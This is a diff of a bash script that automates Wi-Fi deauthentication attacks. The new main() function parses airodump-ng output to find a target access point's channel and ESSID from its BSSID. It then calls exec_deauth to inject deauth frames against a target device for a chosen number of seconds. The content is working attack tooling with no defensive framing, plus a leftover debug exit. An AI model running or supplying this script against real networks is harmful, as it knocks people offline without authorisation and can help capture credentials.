@@ -58,7 +58,39 @@ function exec_deauth(){
 }
 
 # main start
+function main(){
+	IFACE=$1
+	TARGET_BSSID=$2
+	INJECTION_TIME=$3
+	TARGET_DEVICE=$4
 
+	# processing the datas, TARGET_BSSID at column 4
+	echo "Parsing data"
+
+	TARGET_CHANNEL=$(parse $TARGET_BSSID 4)
+
+	# if target channel can't be found, just exit the script
+	if [ -z "$TARGET_CHANNEL" ]; then
+		echo "Target BSSID not found. Exiting."
+		exit 1
+	fi
+
+	# filter out more than two chars of the channel result, may caused by station section of the airodump-ng output
+	TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
+
+	# determine ESSID for informational purpose only
+	TARGET_ESSID=$(parse $TARGET_BSSID 14)
+
+	echo "Automated channel targeting..."
+	echo "Target ESSID = $TARGET_ESSID"
+	echo "Target BSSID = $TARGET_BSSID"
+	echo "Target channel = $TARGET_CHANNEL"
+	echo "Injecting deAuth frame for $INJECTION_TIME second(s)"
+
+	exec_deauth $IFACE $TARGET_CHANNEL $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
+}
+
+# initial
 # sample wireless data
 sample $IFACE $SCAN_TIME
 
@@ -84,27 +116,8 @@ else
 	echo "Normal mode"
 fi
 
-# processing the datas, TARGET_BSSID at column 4
-echo "Parsing data"
+main $IFACE $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
 
-TARGET_CHANNEL=$(parse $TARGET_BSSID 4)
+# debug
+exit 1
 
-# if target channel can't be found, just exit the script
-if [ -z "$TARGET_CHANNEL" ]; then
-	echo "Target BSSID not found. Exiting."
-	exit 1
-fi
-
-# filter out more than two chars of the channel result, may caused by station section of the airodump-ng output
-TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
-
-# determine ESSID for informational purpose only
-TARGET_ESSID=$(parse $TARGET_BSSID 14)
-
-echo "Automated channel targeting..."
-echo "Target ESSID = $TARGET_ESSID"
-echo "Target BSSID = $TARGET_BSSID"
-echo "Target channel = $TARGET_CHANNEL"
-echo "Injecting deAuth frame for $INJECTION_TIME second(s)"
-
-exec_deauth $IFACE $TARGET_CHANNEL $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
